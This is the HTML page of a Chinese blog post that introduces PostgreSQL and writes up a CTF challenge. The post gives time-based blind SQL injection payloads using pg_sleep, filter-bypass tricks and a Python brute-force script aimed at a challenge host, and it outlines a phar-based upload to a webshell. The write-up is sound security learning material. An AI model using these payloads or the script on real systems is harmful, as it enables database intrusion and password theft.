@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="postgresql入门诡异的数据库，和MySQL和SQLite差距巨大，不会用。。。临时入门 登录用apt装下来pgsql之后，在root下键入psql会报如下错误， FATAL:  role &quot;root&quot; does not exist。后来发现是安装pgsql的时候会在当前机器上创建一个名为postgres的用户，可以su切换过去就能跑通了。也可以直接改&#x2F;etc&#x2F;postg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="postgresql入门">
+<meta property="og:url" content="https://blog.z3ratu1.cn/postgresql%E5%85%A5%E9%97%A8.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="postgresql入门诡异的数据库，和MySQL和SQLite差距巨大，不会用。。。临时入门 登录用apt装下来pgsql之后，在root下键入psql会报如下错误， FATAL:  role &quot;root&quot; does not exist。后来发现是安装pgsql的时候会在当前机器上创建一个名为postgres的用户，可以su切换过去就能跑通了。也可以直接改&#x2F;etc&#x2F;postg">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-05-29T11:51:39.000Z">
+<meta property="article:modified_time" content="2022-01-22T05:48:42.699Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="SQLI">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/postgresql%E5%85%A5%E9%97%A8.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>postgresql入门 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/postgresql%E5%85%A5%E9%97%A8.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          postgresql入门
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-29 19:51:39" itemprop="dateCreated datePublished" datetime="2021-05-29T19:51:39+08:00">2021-05-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-22 13:48:42" itemprop="dateModified" datetime="2022-01-22T13:48:42+08:00">2022-01-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/postgresql%E5%85%A5%E9%97%A8.html" class="post-meta-item leancloud_visitors" data-flag-title="postgresql入门" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/postgresql%E5%85%A5%E9%97%A8.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/postgresql%E5%85%A5%E9%97%A8.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="postgresql入门"><a href="#postgresql入门" class="headerlink" title="postgresql入门"></a>postgresql入门</h1><p>诡异的数据库，和MySQL和SQLite差距巨大，不会用。。。临时入门</p>
+<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>用apt装下来pgsql之后，在root下键入psql会报如下错误， <code>FATAL:  role &quot;root&quot; does not exist</code>。后来发现是安装pgsql的时候会在当前机器上创建一个名为postgres的用户，可以su切换过去就能跑通了。也可以直接改<code>/etc/postgresql/9.x/main/pg_hba.conf</code>里面的内容，直接给postgres这个号改成trust然后用systemctl重启一下，就能直接<code>psql -U postgres</code>进数据库了</p>
+<h2 id="简单终端交互"><a href="#简单终端交互" class="headerlink" title="简单终端交互"></a>简单终端交互</h2><p><code>\l</code>显示所有数据<br><code>\c &lt;dbname&gt;</code>切换数据库<br><code>\d</code>显示当前数据库下的表<br><code>\q</code>退出<br>这几个命令和MySQL差距好大，临时学一下。。</p>
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>pgsql的语法细节和mysql之间也有巨大的不同，简单的就比如||实际上是字符串拼接，可以<code>SELECT * FROM users WHERE username=&#39;admi&#39;||&#39;n&#39;</code></p>
+<p>pgsql中将双引号和反引号包裹的内容视为列名，所以字段得用单引号包裹</p>
+<pre><code>test=# select * from users where username=&quot;admin&quot;;
+ERROR:  column &quot;admin&quot; does not exist
+</code></pre>
+<p>MySQL中只有反引号是这个效果，印象里有一次比赛是堆叠注入修改MySQL配置，把||从OR逻辑改成了字符串拼接符号</p>
+<h2 id="题"><a href="#题" class="headerlink" title="题"></a>题</h2><p>DASCTF和BUU联动比赛的一个题，时间刚好撞上XCTF final，神仙们都去打XCTF final了，进不了XCTF final的垃圾开始自嗨<br>一开始本地没有pgsql的环境，payload就盲打也不知道跑不跑得通，网上看的二手文章后来本地搭起来环境之后根本跑不通，看一眼时间还是去年年底发的，国内一堆中文翻译版本。不经让我想起zsx神仙的一句话</p>
+<blockquote>
+<p>珍爱生命，远离二手文章</p>
+</blockquote>
+<p>好像题目还叫checkin，反正最后没人做出来，实际上测的时候没搭本地环境搞不清楚怎么回事，后来本地环境一起就直接搞定了。。。去掉顶尖神仙之后剩下来的战斗力这么不堪吗</p>
+<p>pgsql注入的时候有几个新的关键字，以及一些奇怪的强类型判断，MySQL应该算是会进行弱类型转换的，or语句直接接数字字符串之类的都会直接转换成true，pgsql就会反手一个<br><code>ERROR:  argument of OR must be type boolean, not type void</code>，导致我sleep一下测试都测试不动<br>但是可以通过字符串拼接执行sleep，可能是允许字符串拼一个空上去吧</p>
+<p>从二手文章里抄来的payload<br><code>SELECT username FROM users WHERE username = &#39;&#39;||(SELECT &#39;z33&#39;);</code><br>马上报错<code>ERROR:  failed to find conversion function from unknown to text</code><br>从这里感觉pgsql也存在一些最基础的默认类型转换，比如void转换成字符串是空字符串之类的，但是直接select出来的结果并不能直接变成字符串？</p>
+<p>类型转换一下就可以了，类型转换有两种方法，一个是直接在后面加两冒号接类型<br><code>SELECT username FROM users WHERE username = &#39;&#39;||(SELECT &#39;z33&#39;)::text;</code><br>还有一种是使用cast函数<br><code>SELECT username FROM users WHERE username = &#39;&#39;||cast((SELECT &#39;Penelope&#39;) as text);</code><br>解决了pgsql的类型问题之后注入就变得很简单了</p>
+<p>这里还是继续套用魔改二手文章的payload<br><code>select * from users where username=&#39;&#39;||(select case when(cast((select count((select password from users where password similar to &#39;test_pass%&#39;)))as text)) not like &#39;0&#39; then pg_sleep(2) else &#39;&#39; end);</code><br>因为没有回显只能时间盲注了，使用||进行字符串拼接，<code>select case when condition then xxx else xxx end</code>条件语句，similar to关键字类似于MySQL的regexp，使用正则进行匹配，count数查询出来的结果，判断条件填<code>not like &#39;0&#39;</code>，true就sleep 2s，否则是空字符串。从之前可知void可以直接和字符串拼接，不用类型转换<br>但是这里禁用了<code>&lt;&gt;=</code>这几个比较符号，因为count的返回值是数字，原payload使用的是<code>&lt;&gt;0</code>不等于0，本来想直接用not like绕过，后来本地测试才发现like只能进行字符串之间的比较，所以还套了一层cast把count结果转换到字符串打通</p>
+<h3 id="pgsql的正则匹配"><a href="#pgsql的正则匹配" class="headerlink" title="pgsql的正则匹配"></a>pgsql的正则匹配</h3><p>这里关键考虑一下这个similar to关键字，这个玩意的正则匹配有点邪乎，使用了半像半不像的正则规则，基本上的正则语法都支持，但是原来的<code>.</code>在这里是下划线<code>_</code>，原来的<code>*</code>在这里是百分号<code>%</code>。。。</p>
+<p>虽然单独拿出来用的时候好像并没有什么问题，但是在上面那个payload在没有<code>%</code>的时候似乎不能表现出正则的效果，比如<br><code>select * from users where username=&#39;&#39;||(select case when(cast((select count((select password from users where password similar to &#39;admi_&#39;)))as text)) not like &#39;0&#39; then pg_sleep(2) else &#39;&#39; end);</code><br>就不会sleep，但实际上我有一个内容为admin的密码，改为<br><code>select * from users where username=&#39;&#39;||(select case when(cast((select count((select password from users where password similar to &#39;admi_%&#39;)))as text)) not like &#39;0&#39; then pg_sleep(2) else &#39;&#39; end);</code><br>后成功sleep</p>
+<p>官方文档中有提到LIKE也能正则</p>
+<blockquote>
+<p>如果pattern不包含百分号或者下划线，那么该模式只代表它本身； 这时候LIKE的行为就像等号操作符。在pattern 里的下划线(_)匹配任何单个字符；而一个百分号(%) 匹配零或多个任何序列。</p>
+</blockquote>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>垃圾脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://6003f037-5d85-4e89-94b5-02781319ebdb.node3.buuoj.cn/"</span>
+
+charset <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"</span><span class="token punctuation">)</span>
+
+result <span class="token operator">=</span> <span class="token string">'w3Lc0me_t0_DA5CTF_June'</span>
+<span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    flag <span class="token operator">=</span> <span class="token boolean">True</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"'||(selselectect case when(cast((selselectect count((selselectect password from users where password similar to '{}{}%')))as text)) not like '0' then pg_sleep(2) else '' end)--"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'/**/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>result<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"pwd"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true"># print(data)</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
+        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+            flag <span class="token operator">=</span> <span class="token boolean">False</span>
+            result <span class="token operator">+=</span> i
+            <span class="token keyword">break</span>
+    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+
+len <span class="token operator">=</span> <span class="token number">22</span>
+<span class="token comment" spellcheck="true"># 反过来测一下字段长度</span>
+<span class="token comment" spellcheck="true"># for i in range(40, 0, -1):</span>
+<span class="token comment" spellcheck="true">#     data = {</span>
+<span class="token comment" spellcheck="true">#         "username": "'||(selselectect case when(cast((selselectect count((selselectect password from users where password similar to '{}%')))as text)) not like '0' then pg_sleep(2) else '' end)--".replace(</span>
+<span class="token comment" spellcheck="true">#             ' ', '/**/').format('_'*i), "pwd": "123"}</span>
+<span class="token comment" spellcheck="true">#     time.sleep(0.2)</span>
+<span class="token comment" spellcheck="true">#     start_time = time.time()</span>
+<span class="token comment" spellcheck="true">#     res = requests.post(url, data)</span>
+<span class="token comment" spellcheck="true">#     if time.time() - start_time > 2:</span>
+<span class="token comment" spellcheck="true">#         print(i)</span>
+<span class="token comment" spellcheck="true">#         break</span>
+</code></pre>
+<p>这里有几个坑点，因为下划线是pgsql的正则通配符（还有好多字符比如+什么的），所以盲注的时候这个常用字符就从charset里剔除了，后来发现只能注到welcome，然后反过来用下划线测了一下字段长度，发现有22位长。</p>
+<p>然后想试试转义掉下划线再测看能不能试出来，然后发现题目把转义ban了。<br>最后用<code>[Z-^]</code>这种操作测范围一点点试出来确实是下划线（按常理应该也是这个东西。。。）<br>然后注不动手动加下划线注出密码登录</p>
+<p>然后是一个文件包含加上传，过滤了base，file协议和几个基本的操作<br>先用string.rot13翻转一手把源码读出来，文件上传就限定了后缀，同时检查了不能带有<code>&lt;?</code>，但是并不校验文件格式。文件包含补了后缀.php，没有拼接目录<br>可以整个phar解压缩包含，写个shell.php压缩成zip，改名jpg上传，然后<code>phar://path/shell.jpg/shell</code>包含打通</p>
+<p>拿到shell之后去看了一下有一个不给读的文件的源码，发现了一个针对SQLmap的过滤。我猜这个题是颖奇出的，那个时候才想起来嘶吼CTF有一万个SQL注入都是他出的，其中就有一个pgsql，那个时候好像就已经学了pgsql的憨批类型转换了，但是现在又忘了，然后当时那个题就是有人SQLmap一把梭非预期过</p>
+<p>再抄一份当时颖奇的payload<br><code>&quot;0&#39;and(select/**/case/**/when(substr((select/**/password/**/from/**/users/**/where/**/username=&#39;admin&#39;),&#123;i&#125;,1)=&#39;&#123;char&#125;&#39;)then(select/**/&#39;roarctf&#39;/**/from/**/pg_sleep(3))else/**/&#39;1&#39;/**/end)=&#39;roarctf&#39;--</code></p>
+<p>感觉也差不多吧，这里用了and所以后面的结果得是个bool值，所以用等于号做了个判断<br>不过不是很懂then里面为什么不直接sleep而是select了一下</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/8621">虽然有点毛病但是还是挺实用的二手文章</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.postgres.cn/docs/9.4/functions-matching.html">pgsql模式匹配官方文档</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.gem-love.com/ctf/2702.html">颖奇嘶吼wp</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQLI/" rel="tag"># SQLI</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E4%BA%8C%E5%80%BC%E5%9B%BE%E5%83%8F%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F.html" rel="prev" title="二值图像信息隐藏">
+      <i class="fa fa-chevron-left"></i> 二值图像信息隐藏
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E5%A5%87%E6%80%AA%E9%A2%98%E7%9B%AE.html" rel="next" title="最近做的奇怪题目">
+      最近做的奇怪题目 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#postgresql%E5%85%A5%E9%97%A8"><span class="nav-number">1.</span> <span class="nav-text">postgresql入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BB%E5%BD%95"><span class="nav-number">1.1.</span> <span class="nav-text">登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%BB%88%E7%AB%AF%E4%BA%A4%E4%BA%92"><span class="nav-number">1.2.</span> <span class="nav-text">简单终端交互</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98"><span class="nav-number">1.4.</span> <span class="nav-text">题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pgsql%E7%9A%84%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">1.4.1.</span> <span class="nav-text">pgsql的正则匹配</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc"><span class="nav-number">1.4.2.</span> <span class="nav-text">poc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.5.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
